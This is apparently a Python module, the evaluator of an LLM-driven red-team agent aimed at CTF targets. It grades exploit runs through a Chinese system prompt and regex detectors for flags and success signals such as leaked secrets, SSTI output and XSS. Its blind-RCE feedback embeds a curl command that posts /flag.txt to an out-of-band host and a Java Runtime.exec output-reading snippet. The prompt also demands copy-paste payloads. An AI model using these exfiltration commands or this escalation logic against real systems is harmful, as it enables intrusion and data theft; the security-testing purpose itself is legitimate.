from __future__ import annotations

import json
import re
from pathlib import Path
from typing import Any

from core.challenge_adapter import ChallengeAdapter
from core.llm_client import DeepSeekClient
from core.memory_store import LayeredMemory
from core.settings import Settings

# ────────────────────────────────────────────────────────────────
# 常量
# ────────────────────────────────────────────────────────────────
_MAX_OUTPUT_CHARS = 2000          # per-field budget before head+tail truncation
_HEAD_TAIL_CHARS  = 1000          # chars kept from head and tail when truncating
_ANSI_RE = re.compile(r"\x1b\[[0-9;]*[mGKHF]")

# Flag 格式白名单正则（CTF 常见格式）
_FLAG_PATTERNS: list[re.Pattern] = [
    re.compile(r"flag\{[^}]{1,200}\}", re.IGNORECASE),
    re.compile(r"CTF\{[^}]{1,200}\}", re.IGNORECASE),
    re.compile(r"DUCTF\{[^}]{1,200}\}", re.IGNORECASE),
    re.compile(r"HTB\{[^}]{1,200}\}", re.IGNORECASE),
    re.compile(r"picoCTF\{[^}]{1,200}\}", re.IGNORECASE),
    re.compile(r"[A-Z0-9_]{2,10}\{[A-Za-z0-9_\-=+/]{8,200}\}", re.IGNORECASE),
]

# 强攻击成功信号（非 flag 但明确表示攻击成功）
_SUCCESS_SIGNALS: list[re.Pattern] = [
    re.compile(r"Werkzeug\s+Debugger", re.IGNORECASE),
    re.compile(r"Traceback.*SECRET", re.IGNORECASE | re.DOTALL),
    re.compile(r'"api_key"\s*:', re.IGNORECASE),
    re.compile(r'"jwt_secret"\s*:', re.IGNORECASE),
    re.compile(r'"database_password"\s*:', re.IGNORECASE),
    re.compile(r'"rendered"\s*:\s*"49"', re.IGNORECASE),
    re.compile(r"<script>[^<]{0,200}</script>", re.IGNORECASE),
]

# 无回显 RCE 判定：步骤 ok=True 但 stdout 实质为空
_BLANK_STDOUT_RE = re.compile(r"^\s*$")

_BLIND_RCE_FEEDBACK = (
    "检测到命令可能已执行但无回显 (Blind RCE)。请立即停止单纯更换命令！"
    "必须升级战术：\n"
    "1. 优先使用 SDK 中的 `redteam_sdk.OOBReceiver` 进行带外数据提取 (OOB)，"
    "例如：`oob=OOBReceiver(port=8765); oob.start(); "
    "# payload 改为 curl -d @/flag.txt {oob.url}`\n"
    "2. 若在 Java/Python 等语言上下文中，使用代码级别的文件流读取（如 Java "
    "`new Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter('\\\\A').next()`）；\n"
    "3. 尝试在 shell 命令末尾追加 `2>&1` 将错误流合并到标准输出。"
)


# ────────────────────────────────────────────────────────────────
# System Prompt
# ────────────────────────────────────────────────────────────────
EVAL_SYSTEM = """你是 Co-RedTeam 评估智能体（Evaluation Agent），对齐论文 §3.3 职责。

【输出要求】严格输出单个 JSON 对象，禁止任何 Markdown 标记，字段如下：
{
  "repro_success": bool,
  "confidence": number (0.0-1.0),
  "analysis": {
    "what_happened": "string — 逐步描述实际发生了什么：引用真实的 HTTP 状态码、响应体片段、错误信息、OOB 回调内容",
    "vs_expectation": "string — 逐步对比每个步骤的 expected_outcome 与实际输出，说明哪些达到预期、哪些没有、为什么",
    "guidance": "string — 给 Planner 的下一步确切建议：必须包含可直接复制的代码片段或 payload，不能只说'修正字段名'"
  },
  "summary": "string — 一句话总结本轮结果",
  "feedback_for_planner": "string — 对 Planner 的直接指令，必须可操作",
  "should_continue": bool,
  "memory_patch": {
    "pattern": { "add_patterns": [ { ... } ] },
    "strategy": { "add_success": [ { ... } ], "add_failures": [ { ... } ] },
    "tech": { "add_commands": [ { ... } ], "add_payload_templates": [ { ... } ], "add_scripts": [ { ... } ] }
  }
}

【成功判定规则（基于 expected_outcome，优先级从高到低）】：

判定的核心依据是每个步骤的 `expected_outcome` 字段，而不是固定的 flag 字符串格式。

1. ✅ 最高优先级 — 拿到 Flag：
   stdout 中出现明确的 flag 格式（flag{...} / CTF{...} / HTB{...} 等任意 CTF 格式）
   → repro_success=true，should_continue=false
   → analysis.what_happened 中必须引用完整 flag 字符串

2. ✅ 高优先级 — 步骤 expected_outcome 满足：
   对每个步骤，将其 expected_outcome 与实际 stdout/stderr 对比：
   - 若 expected_outcome 是"获取数据库版本" → stdout 中出现版本号字符串即满足
   - 若 expected_outcome 是"收到 OOB 回调" → stdout 中出现 oob_path/oob_body 即满足
   - 若 expected_outcome 是"触发 SSTI" → stdout 中出现数学计算结果（如 49）即满足
   - 若 expected_outcome 是"登录成功" → HTTP 200 + 含 token/session 即满足
   - 若 expected_outcome 是"权限提升" → 响应中出现 admin/role 变化即满足
   当 50%+ 步骤满足其 expected_outcome → repro_success=true，confidence=0.6-0.8，should_continue=true（继续深入）

3. ✅ 中优先级 — 强攻击成功信号（无 expected_outcome 时的兜底）：
   stdout 包含：Werkzeug Debugger、jwt_secret/api_key 泄露、XSS 反射、RCE 命令输出等
   → repro_success=true，should_continue=true，confidence≥0.7

4. ❌ 强制失败 — 所有步骤 stdout 均为空：
   → repro_success=false，无论 exit_code 如何

5. ❌ 强制失败 — 仅有连接错误或超时，无任何响应内容：
   → repro_success=false

6. ⚠️ 部分成功：
   有实质输出但未满足任何 expected_outcome → repro_success=false，confidence=0.3，
   guidance 必须给出具体修复方案

7. 🔴 最高优先级规则 — Blind RCE 降级（凌驾于其他规则之上）：
   若有步骤 ok=True（exit_code=0）但该步骤 stdout 实质为空（空白符/空字符串），
   且未检测到 flag 或强成功信号：
   → repro_success=false，confidence ≤ 0.6（绝对禁止 ≥ 0.9），should_continue=true
   → feedback_for_planner 必须包含 OOB 战术升级指引（OOBReceiver / 文件流读取 / 2>&1）
   → 禁止因"exit_code=0"就断定攻击成功！exit_code=0 只能说明命令被接受，不代表有回显。

【analysis 三段论填写规则（必须严格执行）】：
- what_happened：逐步引用真实数据（HTTP状态码、响应体片段、错误类型、OOB 内容）
- vs_expectation：逐步对比 expected_outcome，说明差距和原因
- guidance：必须给出可直接复制的具体修复代码或 payload，不能只说"修正字段名"

【memory_patch 填写规则】：
- 每个失败步骤必须对应一条 add_failures（错误模式 + 根因 + 修复建议）
- 成功步骤的有效 payload 必须记录到 tech.add_payload_templates

【REST API 错误识别】：
- "All fields are required!" + 用了 username → 正确字段是 email，必须在 guidance 给出示例代码
- "Invalid Email Address" + payload 含 {{ 或 {% → 换用 username/fullName 字段注入
- "CSRF Detected" → 检查 token 获取与传递方式
- 同一错误连续多轮 → guidance 必须给出可直接复制的正确代码"""


# ────────────────────────────────────────────────────────────────
# 脏数据清洗
# ────────────────────────────────────────────────────────────────

def _clean_str(s: str, max_chars: int = _MAX_OUTPUT_CHARS) -> str:
    """Strip ANSI escape codes and truncate to head+tail to prevent context flooding."""
    if not isinstance(s, str):
        s = str(s)
    s = _ANSI_RE.sub("", s)
    if len(s) > max_chars:
        head = s[:_HEAD_TAIL_CHARS]
        tail = s[-_HEAD_TAIL_CHARS:]
        omitted = len(s) - 2 * _HEAD_TAIL_CHARS
        s = f"{head}\n...[{omitted} chars omitted]...\n{tail}"
    return s


def _sanitize_exec_output(exec_out: dict[str, Any], plan: dict[str, Any] | None = None) -> dict[str, Any]:
    """Sanitize executor output: truncate stdout/stderr with head+tail, strip ANSI.

    Also injects each step's `expected_outcome` and `purpose` from the plan so the
    LLM can compare actual output against the step's stated goal without needing to
    cross-reference a separate document.
    """
    import copy
    out = copy.deepcopy(exec_out)

    # Build a step_id → plan_step lookup for expected_outcome injection
    plan_steps: dict[int, dict] = {}
    if plan:
        for st in plan.get("steps") or []:
            if isinstance(st, dict) and st.get("id") is not None:
                plan_steps[int(st["id"])] = st

    for sr in out.get("step_results") or []:
        res = sr.get("result") or {}
        res["stdout"] = _clean_str(res.get("stdout", ""))
        res["stderr"] = _clean_str(res.get("stderr", ""), max_chars=500)
        sr["result"] = res
        # Inject expected_outcome and purpose from plan so LLM can compare directly
        step_id = sr.get("step_id")
        if step_id is not None and int(step_id) in plan_steps:
            ps = plan_steps[int(step_id)]
            sr.setdefault("expected_outcome", ps.get("expected_outcome", ""))
            sr.setdefault("purpose", ps.get("purpose", ""))
    return out


# ────────────────────────────────────────────────────────────────
# Flag / 成功信号检测
# ────────────────────────────────────────────────────────────────

def _detect_flag(text: str) -> str:
    """从文本中匹配 flag，返回第一个匹配或空字符串。"""
    for pat in _FLAG_PATTERNS:
        m = pat.search(text)
        if m:
            return m.group(0)
    return ""


def _detect_success_signal(text: str) -> str:
    """检测强攻击成功信号，返回触发的信号片段或空字符串。"""
    for pat in _SUCCESS_SIGNALS:
        m = pat.search(text)
        if m:
            return m.group(0)[:120]
    return ""


def _detect_blind_rce(step_results: list[dict[str, Any]]) -> bool:
    """Return True when at least one step succeeded (ok=True) but produced no
    meaningful stdout — the classic Blind-RCE symptom."""
    found_ok = False
    for sr in step_results:
        res = sr.get("result") or {}
        if res.get("ok"):
            found_ok = True
            stdout = res.get("stdout", "")
            if not _BLANK_STDOUT_RE.match(stdout):
                return False  # at least one ok step has real output → not blind
    return found_ok  # all ok steps had blank stdout


# ────────────────────────────────────────────────────────────────
# Mock 评估（无 LLM 时）
# ────────────────────────────────────────────────────────────────

def _mock_evaluate(confirmed: dict[str, Any], plan: dict[str, Any], exec_out: dict[str, Any]) -> dict[str, Any]:
    executed = exec_out.get("executed")
    if not executed:
        return {
            "version": 1,
            "repro_success": False,
            "confidence": 0.2,
            "analysis": {
                "what_happened": "计划未被执行，验证阶段失败或计划被安全层阻止。",
                "vs_expectation": "预期执行攻击步骤，实际未执行任何步骤。",
                "guidance": "检查 validator 报错，确保步骤结构合法，type 字段为 python 或 shell，command 无语法错误。",
            },
            "summary": "未执行：验证失败或计划被阻止。",
            "feedback_for_planner": "根据验证错误修订计划，保证 step 结构合法。",
            "should_continue": True,
            "memory_patch": {
                "strategy": {
                    "add_failures": [{
                        "summary": "计划在验证阶段失败，应缩小步骤粒度并自查命令安全性",
                        "context": confirmed.get("vuln_id", "unknown"),
                    }]
                }
            },
        }

    results = exec_out.get("step_results") or []
    all_stdouts = " ".join((r.get("result") or {}).get("stdout", "") for r in results)
    flag = _detect_flag(all_stdouts)
    signal = _detect_success_signal(all_stdouts) if not flag else ""
    all_ok = all((r.get("result") or {}).get("ok") for r in results)
    blind_rce = _detect_blind_rce(results) if not flag and not signal else False

    if flag:
        success, confidence = True, 0.95
        what_happened = f"检测到 flag：{flag}"
    elif signal:
        success, confidence = True, 0.75
        what_happened = f"检测到攻击成功信号：{signal}"
    elif blind_rce:
        success, confidence = False, 0.5
        what_happened = "步骤退出码为 0（ok=True）但 stdout 全部为空，疑似 Blind RCE：命令已执行但无回显。"
    elif not all_stdouts.strip():
        success, confidence = False, 0.1
        what_happened = "所有步骤 stdout 均为空，无法判断攻击结果。"
    elif all_ok:
        success, confidence = True, 0.6
        what_happened = "所有步骤退出码为 0，有输出但未检测到明确 flag。"
    else:
        success, confidence = False, 0.3
        what_happened = "部分步骤失败，未检测到成功信号。"

    blind_rce_feedback = _BLIND_RCE_FEEDBACK if blind_rce else (
        "若失败：拆分命令、增加探测步骤；若成功：固化可复用 payload 到技术记忆。"
    )

    return {
        "version": 1,
        "repro_success": success,
        "confidence": confidence,
        "analysis": {
            "what_happened": what_happened,
            "vs_expectation": "MOCK 模式：基于本地正则检测，未进行语义分析。",
            "guidance": (
                _BLIND_RCE_FEEDBACK if blind_rce
                else "启用 LLM 以获得详细的三段论分析和可操作建议。"
            ),
        },
        "summary": what_happened,
        "feedback_for_planner": blind_rce_feedback,
        "should_continue": not success or blind_rce,
        "memory_patch": {},
    }


# ────────────────────────────────────────────────────────────────
# 主入口
# ────────────────────────────────────────────────────────────────

def run_evaluator(
    settings: Settings,
    memory: LayeredMemory,
    confirmed: dict[str, Any],
    plan: dict[str, Any],
    exec_out: dict[str, Any],
    feedback_path: Path,
    llm: DeepSeekClient | None,
    adapter: ChallengeAdapter | None = None,
) -> dict[str, Any]:
    # ── 1. 脏数据清洗（截断 + 去 ANSI）+ expected_outcome 注入
    clean_exec_out = _sanitize_exec_output(exec_out, plan=plan)

    # ── 2. 本地预判定（不依赖 LLM）────────────────────
    all_stdouts = " ".join(
        (r.get("result") or {}).get("stdout", "")
        for r in clean_exec_out.get("step_results") or []
    )
    pre_flag    = _detect_flag(all_stdouts)
    pre_signal  = _detect_success_signal(all_stdouts) if not pre_flag else ""
    pre_blind   = _detect_blind_rce(clean_exec_out.get("step_results") or []) if not pre_flag and not pre_signal else False

    # ── 3. Mock 模式 ────────────────────────────────
    if settings.mock_llm or llm is None:
        fb = _mock_evaluate(confirmed, plan, clean_exec_out)
        memory.apply_evaluator_patch(fb.get("memory_patch") or {})
        feedback_path.parent.mkdir(parents=True, exist_ok=True)
        feedback_path.write_text(json.dumps(fb, ensure_ascii=False, indent=2), encoding="utf-8")
        return fb

    # ── 4. 构建 Prompt ──────────────────────────────
    system_prompt = EVAL_SYSTEM
    if adapter is not None:
        extra = adapter.eval_extra_rules()
        if extra:
            system_prompt = EVAL_SYSTEM + "\n\n【靶场专项规则】\n" + extra

    # 预检测结果注入（减少 LLM 幻觉）
    pre_detection_note = ""
    if pre_flag:
        pre_detection_note = (
            f"\n\n【⚠️ 本地预检测】已在 stdout 中正则匹配到 flag：{pre_flag}\n"
            f"请确保 repro_success=true，should_continue=false，并在 analysis.what_happened 中引用完整 flag。"
        )
    elif pre_signal:
        pre_detection_note = (
            f"\n\n【⚠️ 本地预检测】检测到强攻击成功信号：{pre_signal[:80]}\n"
            f"请在评估时将此信号纳入 repro_success 判定（应为 true）。"
        )
    elif pre_blind:
        pre_detection_note = (
            f"\n\n【⚠️ 本地预检测 — Blind RCE 疑似】有步骤 ok=True 但 stdout 全部为空。\n"
            f"这是 Blind RCE 的典型特征：命令已执行，但输出未回显到 HTTP 响应。\n"
            f"判定规则：confidence 不得超过 0.6，repro_success=false，should_continue=true。\n"
            f"feedback_for_planner 必须包含以下内容：{_BLIND_RCE_FEEDBACK}"
        )

    user_payload = {
        "confirmed_vuln": confirmed,
        "plan": plan,
        "execution_result": clean_exec_out,
    }
    user_msg = json.dumps(user_payload, ensure_ascii=False) + pre_detection_note

    # ── 5. 调用 LLM ─────────────────────────────────
    fb = llm.complete_json(system_prompt, user_msg)
    fb.setdefault("version", 1)

    # ── 6. 严谨成功判定覆写（防 LLM 幻觉）─────────────
    if pre_flag and not fb.get("repro_success"):
        # 本地检测到 flag，强制成功
        fb["repro_success"] = True
        fb["should_continue"] = False
        fb.setdefault("analysis", {})
        fb["analysis"]["what_happened"] = (
            fb["analysis"].get("what_happened", "") +
            f"（本地强制覆写：检测到 flag {pre_flag}）"
        )
    elif pre_blind:
        # Blind RCE：强制降级，防止 LLM 虚报高置信度
        fb["repro_success"] = False
        fb["should_continue"] = True
        if fb.get("confidence", 0) >= 0.9:
            fb["confidence"] = 0.5
        fb.setdefault("analysis", {})
        fb["analysis"]["what_happened"] = (
            fb["analysis"].get("what_happened", "")
            + "（本地强制覆写：步骤 ok=True 但 stdout 全部为空，疑似 Blind RCE）"
        )
        # 确保 feedback_for_planner 包含 OOB 战术指引
        existing_fb = fb.get("feedback_for_planner", "")
        if "OOBReceiver" not in existing_fb:
            fb["feedback_for_planner"] = _BLIND_RCE_FEEDBACK + (
                f"\n\n（原 LLM 反馈：{existing_fb}）" if existing_fb else ""
            )
    elif not all_stdouts.strip() and fb.get("repro_success"):
        # 所有 stdout 为空，强制失败
        fb["repro_success"] = False
        fb["should_continue"] = True
        fb.setdefault("analysis", {})
        fb["analysis"]["vs_expectation"] = (
            "所有步骤 stdout 为空，不满足成功判定条件（本地强制覆写）。"
        )

    # ── 7. 确保 analysis 三段论完整 ─────────────────
    fb.setdefault("analysis", {})
    fb["analysis"].setdefault("what_happened",  "（LLM 未填写此字段）")
    fb["analysis"].setdefault("vs_expectation", "（LLM 未填写此字段）")
    fb["analysis"].setdefault("guidance",       "（LLM 未填写此字段）")

    # ── 8. 写入记忆和文件 ────────────────────────────
    memory.apply_evaluator_patch(fb.get("memory_patch") or {})
    feedback_path.parent.mkdir(parents=True, exist_ok=True)
    feedback_path.write_text(json.dumps(fb, ensure_ascii=False, indent=2), encoding="utf-8")
    return fb
